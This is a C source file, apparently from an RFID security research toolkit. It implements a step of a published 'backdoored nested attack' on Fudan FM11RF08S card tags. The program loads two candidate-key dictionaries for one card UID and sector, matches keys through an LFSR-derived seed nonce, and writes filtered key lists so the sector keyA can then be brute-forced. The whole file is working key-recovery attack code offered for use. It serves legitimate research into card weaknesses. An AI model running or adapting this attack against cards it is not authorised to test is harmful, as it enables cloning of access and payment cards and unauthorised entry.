// Faster Backdoored Nested Attack against Fudan FM11RF08S tags
//
// Attack conditions:
// * Backdoor
// * keyA and keyB are different for the targeted sector
//
// Strategy:
// * Use backdoor on the targeted sector to get the clear static nested nT for keyA and for keyB
// * Generate 2 lists of key candidates based on clear and encrypted nT
// * Search couples of keyA/keyB satisfying some obscure relationship
// * Use the resulting dictionary to bruteforce the keyA (and staticnested_2x1nt_rf08s_1key for keyB)
//
//  Doegox, 2024, cf https://eprint.iacr.org/2024/1275 for more info

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <inttypes.h>

uint16_t i_lfsr16[1 << 16] = {0};
uint16_t s_lfsr16[1 << 16] = {0};

static void init_lfsr16_table(void) {
    uint16_t x = 1;
    for (uint16_t i = 1; i; ++i) {
        i_lfsr16[(x & 0xff) << 8 | x >> 8] = i;
        s_lfsr16[i] = (x & 0xff) << 8 | x >> 8;
        x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15;
    }
}

// static uint16_t next_lfsr16(uint16_t nonce) {
//     uint16_t i = i_lfsr16[nonce];
//     if (i == 0xffff) {
//         i = 1;
//     } else {
//         i++;
//     }
//     return s_lfsr16[i];
// }

static uint16_t prev_lfsr16(uint16_t nonce) {
    uint16_t i = i_lfsr16[nonce];
    if (i == 1) {
        i = 0xffff;
    } else {
        i--;
    }
    return s_lfsr16[i];
}

static uint16_t compute_seednt16_nt32(uint32_t nt32, uint64_t key) {
    uint8_t a[] = {0, 8, 9, 4, 6, 11, 1, 15, 12, 5, 2, 13, 10, 14, 3, 7};
    uint8_t b[] = {0, 13, 1, 14, 4, 10, 15, 7, 5, 3, 8, 6, 9, 2, 12, 11};
    uint16_t nt = nt32 >> 16;
    uint8_t prev = 14;
    for (uint8_t i = 0; i < prev; i++) {
        nt = prev_lfsr16(nt);
    }
    uint8_t prevoff = 8;
    bool odd = 1;

    for (uint8_t i = 0; i < 6 * 8; i += 8) {
        if (odd) {
            nt ^= (a[(key >> i) & 0xF]);
            nt ^= (b[(key >> i >> 4) & 0xF]) << 4;
        } else {
            nt ^= (b[(key >> i) & 0xF]);
            nt ^= (a[(key >> i >> 4) & 0xF]) << 4;
        }
        odd ^= 1;
        prev += prevoff;
        for (uint8_t j = 0; j < prevoff; j++) {
            nt = prev_lfsr16(nt);
        }
    }
    return nt;
}

int main(int argc, char *const argv[]) {

    if (argc != 3) {
        printf("Usage:\n  %s keys_<uid:08x>_<sector:02>_<nt1:08x>.dic keys_<uid:08x>_<sector:02>_<nt2:08x>.dic\n"
               "  where both dict files are produced by staticnested_1nt *for the same UID and same sector*\n",
               argv[0]);
        return 1;
    }

    uint32_t uid1, sector1, nt1, uid2, sector2, nt2;
    char *filename1 = argv[1], *filename2 = argv[2];

    int result = sscanf(filename1, "keys_%8x_%2u_%8x.dic", &uid1, &sector1, &nt1);
    if (result != 3) {
        fprintf(stderr, "Error: Failed to parse the filename %s.\n", filename1);
        return 1;
    }

    result = sscanf(filename2, "keys_%8x_%2u_%8x.dic", &uid2, &sector2, &nt2);
    if (result != 3) {
        fprintf(stderr, "Error: Failed to parse the filename %s.\n", filename2);
        return 1;
    }

    if (uid1 != uid2) {
        fprintf(stderr, "Error: Files must belong to the same UID.\n");
        return 1;
    }

    if (sector1 != sector2) {
        fprintf(stderr, "Error: Files must belong to the same sector.\n");
        return 1;
    }

    if (nt1 == nt2) {
        fprintf(stderr, "Error: Files must belong to different nonces.\n");
        return 1;
    }

    init_lfsr16_table();

    uint32_t keycount1 = 0;
    uint64_t *keys1 = NULL;
    uint8_t *filter_keys1 = NULL;
    uint16_t *seednt1 = NULL;
    uint32_t keycount2 = 0;
    uint64_t *keys2 = NULL;
    uint8_t *filter_keys2 = NULL;
    FILE *fptr;

    fptr = fopen(filename1, "r");
    if (fptr != NULL) {

        uint64_t buffer;
        while (fscanf(fptr, "%012" PRIx64, &buffer) == 1) {
            keycount1++;
        }

        keys1 = (uint64_t *)calloc(1, keycount1 * sizeof(uint64_t));
        filter_keys1 = (uint8_t *)calloc(keycount1, sizeof(uint8_t));
        if ((keys1 == NULL) || (filter_keys1 == NULL)) {
            perror("Failed to allocate memory");
            fclose(fptr);
            goto end;
        }

        rewind(fptr);

        for (uint32_t i = 0; i < keycount1; i++) {
            if (fscanf(fptr, "%012" PRIx64, &keys1[i]) != 1) {
                perror("Failed to read key");
                fclose(fptr);
                goto end;
            }
        }
        fclose(fptr);
    } else {
        fprintf(stderr, "Warning: Cannot open %s\n", filename1);
        goto end;
    }

    fptr = fopen(filename2, "r");
    if (fptr != NULL) {

        uint64_t buffer;
        while (fscanf(fptr, "%012" PRIx64, &buffer) == 1) {
            keycount2++;
        }

        keys2 = (uint64_t *)calloc(1, keycount2 * sizeof(uint64_t));
        filter_keys2 = (uint8_t *)calloc(keycount2, sizeof(uint8_t));
        if ((keys2 == NULL) || (filter_keys2 == NULL)) {
            perror("Failed to allocate memory");
            fclose(fptr);
            goto end;
        }

        rewind(fptr);

        for (uint32_t i = 0; i < keycount2; i++) {
            if (fscanf(fptr, "%012" PRIx64, &keys2[i]) != 1) {
                perror("Failed to read key");
                fclose(fptr);
                goto end;
            }
        }
        fclose(fptr);
    } else {
        fprintf(stderr, "Warning: Cannot open %s\n", filename2);
        goto end;
    }

    printf("%s: %u keys loaded\n", filename1, keycount1);
    printf("%s: %u keys loaded\n", filename2, keycount2);

    seednt1 = (uint16_t *)calloc(1, keycount1 * sizeof(uint16_t));
    if (seednt1 == NULL) {
        perror("Failed to allocate memory");
        goto end;
    }

    for (uint32_t i = 0; i < keycount1; i++) {
        seednt1[i] = compute_seednt16_nt32(nt1, keys1[i]);
    }

    for (uint32_t j = 0; j < keycount2; j++) {
        uint16_t seednt2 = compute_seednt16_nt32(nt2, keys2[j]);
        for (uint32_t i = 0; i < keycount1; i++) {
            if (seednt2 == seednt1[i]) {
//                printf("MATCH: key1=%012" PRIx64 " key2=%012" PRIx64 "\n", keys1[i], keys2[j]);
                filter_keys1[i] = 1;
                filter_keys2[j] = 1;
            }
        }
    }

    char filter_filename1[40];
    uint32_t filter_keycount1 = 0;
    snprintf(filter_filename1, sizeof(filter_filename1), "keys_%08x_%02u_%08x_filtered.dic", uid1, sector1, nt1);

    fptr = fopen(filter_filename1, "w");
    if (fptr != NULL) {

        for (uint32_t j = 0; j < keycount1; j++) {
            if (filter_keys1[j]) {
                filter_keycount1++;
                fprintf(fptr, "%012" PRIx64 "\n", keys1[j]);
            }
        }
        fclose(fptr);

    } else {
        fprintf(stderr, "Warning: Cannot save keys in %s\n", filter_filename1);
    }

    char filter_filename2[40];
    uint32_t filter_keycount2 = 0;
    snprintf(filter_filename2, sizeof(filter_filename2), "keys_%08x_%02u_%08x_filtered.dic", uid2, sector2, nt2);

    fptr = fopen(filter_filename2, "w");
    if (fptr != NULL) {

        for (uint32_t j = 0; j < keycount2; j++) {
            if (filter_keys2[j]) {
                filter_keycount2++;
                fprintf(fptr, "%012" PRIx64 "\n", keys2[j]);
            }
        }
        fclose(fptr);

    } else {
        fprintf(stderr, "Warning: Cannot save keys in %s\n", filter_filename2);
    }
    printf("%s: %u keys saved\n", filter_filename1, filter_keycount1);
    printf("%s: %u keys saved\n", filter_filename2, filter_keycount2);

end:
    if (keys1 != NULL) {
        free(keys1);
    }

    if (keys2 != NULL) {
        free(keys2);
    }

    if (filter_keys1 != NULL) {
        free(filter_keys1);
    }

    if (filter_keys2 != NULL) {
        free(filter_keys2);
    }

    if (seednt1 != NULL) {
        free(seednt1);
    }

    return 0;
}
